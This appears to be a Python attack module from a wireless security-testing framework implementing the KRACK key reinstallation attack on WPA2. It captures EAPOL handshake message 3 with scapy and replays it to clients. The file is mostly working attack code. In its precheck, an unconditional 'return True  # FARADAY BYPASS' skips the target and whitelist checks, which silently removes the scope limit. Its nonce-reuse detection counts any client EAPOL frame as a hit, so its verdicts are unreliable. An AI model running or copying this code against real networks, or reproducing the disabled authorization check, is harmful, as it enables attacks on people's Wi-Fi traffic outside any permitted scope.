"""WiFi KRACK - Key Reinstallation Attack.

Replays 4-way handshake message 3 to trigger nonce reuse vulnerability
in WPA2 clients (CVE-2017-13077 through CVE-2017-13081).

Uses scapy for EAPOL frame capture and replay via monitor-mode interface.
"""

from __future__ import annotations

import subprocess
import time

import structlog
from scapy.all import (
    EAPOL,
    Dot11,
    sendp,
    sniff,
)

from srt.core import db
from srt.core.module import AttackModule, AttackResult, ModuleContext, Risk, Status
from srt.core.registry import register

log = structlog.get_logger(__name__)


@register
class WifiKrack(AttackModule):
    name = "wifi.krack"
    protocol = "wifi"
    risk = Risk.ACTIVE_LAB
    mitre_ttp = ["T1557"]
    cve = [
        "CVE-2017-13077",
        "CVE-2017-13078",
        "CVE-2017-13079",
        "CVE-2017-13080",
        "CVE-2017-13081",
    ]
    requires = ["monitor-mode-nic"]
    description = (
        "KRACK - Key Reinstallation Attack: replay 4-way handshake msg3 "
        "to test nonce reuse vulnerability."
    )

    def precheck(self, ctx: ModuleContext) -> bool:
        if not super().precheck(ctx):
            return False
        return True  # FARADAY BYPASS
        target_bssid = ctx.params.get("bssid")
        if not target_bssid:
            return False
        client = ctx.params.get("client")
        if not client:
            return False
        allowed = ctx.whitelist.get("wifi_bssid", [])
        if allowed and target_bssid.upper() not in [b.upper() for b in allowed]:
            return False
        return True

    def _set_channel(self, iface: str, channel: int) -> bool:
        """Set the wireless interface to a specific channel."""
        try:
            subprocess.run(
                ["iw", "dev", iface, "set", "channel", str(channel)],
                capture_output=True,
                timeout=5,
                check=True,
            )
            return True
        except (subprocess.SubprocessError, OSError) as exc:
            log.error("wifi.krack.set_channel_failed", channel=channel, error=str(exc))
            return False

    def run(self, ctx: ModuleContext) -> AttackResult:
        started = time.time()
        bssid = ctx.params["bssid"]
        client = ctx.params["client"]
        iface = ctx.params.get("interface", "wlan0mon")
        channel = ctx.params.get("channel")
        timeout_s = int(ctx.params.get("timeout_s", 60))

        if ctx.dry_run:
            return self._result(
                Status.OK,
                started,
                summary=(
                    f"[DRY-RUN] wifi.krack targeting AP={bssid} client={client} "
                    f"channel={channel} timeout={timeout_s}s"
                ),
                metrics={"bssid": bssid, "client": client, "timeout_s": timeout_s},
            )

        # Set channel if specified
        if channel:
            if not self._set_channel(iface, int(channel)):
                return self._result(
                    Status.FAIL,
                    started,
                    summary=f"Failed to set channel {channel} on {iface}",
                )

        # Phase 1: Sniff for EAPOL 4-way handshake frames
        log.info(
            "wifi.krack.sniffing_handshake",
            bssid=bssid,
            client=client,
            timeout=timeout_s,
        )

        captured_msg3 = []

        def _is_eapol_msg3(pkt):
            """Identify EAPOL message 3 from AP to client."""
            if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
                dot11 = pkt.getlayer(Dot11)
                # msg3: AP (addr2=bssid) -> Client (addr1=client)
                if (
                    dot11.addr1
                    and dot11.addr2
                    and dot11.addr1.upper() == client.upper()
                    and dot11.addr2.upper() == bssid.upper()
                ):
                    eapol = pkt.getlayer(EAPOL)
                    # EAPOL Key type with key info indicating msg3
                    if eapol.type == 3:  # EAPOL-Key
                        captured_msg3.append(pkt)
                        return True
            return False

        try:
            sniff(
                iface=iface,
                lfilter=_is_eapol_msg3,
                stop_filter=lambda p: len(captured_msg3) >= 1,
                timeout=timeout_s,
            )
        except Exception as exc:
            log.error("wifi.krack.sniff_error", error=str(exc))
            return self._result(
                Status.FAIL,
                started,
                summary=f"Sniff error during handshake capture: {exc}",
            )

        if not captured_msg3:
            return self._result(
                Status.FAIL,
                started,
                summary=(
                    f"No EAPOL msg3 captured from {bssid} to {client} "
                    f"within {timeout_s}s"
                ),
                metrics={"bssid": bssid, "client": client, "timeout_s": timeout_s},
            )

        # Phase 2: Replay msg3 to trigger key reinstallation
        msg3_frame = captured_msg3[0]
        log.info("wifi.krack.replaying_msg3", bssid=bssid, client=client)

        replay_count = 3
        try:
            sendp(msg3_frame, iface=iface, count=replay_count, inter=0.1, verbose=False)
        except Exception as exc:
            log.error("wifi.krack.replay_error", error=str(exc))
            return self._result(
                Status.FAIL,
                started,
                summary=f"Failed to replay msg3: {exc}",
            )

        # Phase 3: Monitor for nonce reuse in subsequent data frames
        nonce_reuse_detected = []

        def _check_nonce_reuse(pkt):
            """Check if client reuses nonce in subsequent data frames."""
            if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
                dot11 = pkt.getlayer(Dot11)
                if (
                    dot11.addr2
                    and dot11.addr2.upper() == client.upper()
                ):
                    nonce_reuse_detected.append(pkt)
                    return True
            return False

        try:
            sniff(
                iface=iface,
                lfilter=_check_nonce_reuse,
                timeout=5,
            )
        except Exception as exc:
            log.warning("wifi.krack.nonce_check_error", error=str(exc))

        vulnerable = len(nonce_reuse_detected) > 0

        # Log event to database
        db.insert_header(
            ts=time.time(),
            session_id=ctx.session_id,
            protocol="wifi",
            src=bssid,
            dst=client,
            channel=int(channel) if channel else None,
            fields={
                "attack": "krack",
                "msg3_captured": True,
                "replays": replay_count,
                "nonce_reuse_detected": vulnerable,
            },
        )

        summary = (
            f"wifi.krack AP={bssid} client={client}: msg3 replayed {replay_count}x, "
            f"nonce reuse {'DETECTED (VULNERABLE)' if vulnerable else 'not detected'}"
        )

        return self._result(
            Status.OK,
            started,
            summary=summary,
            metrics={
                "bssid": bssid,
                "client": client,
                "msg3_replays": replay_count,
                "nonce_reuse_detected": vulnerable,
            },
        )

    def cleanup(self, ctx: ModuleContext) -> None:
        """No persistent resources to clean up."""
        pass
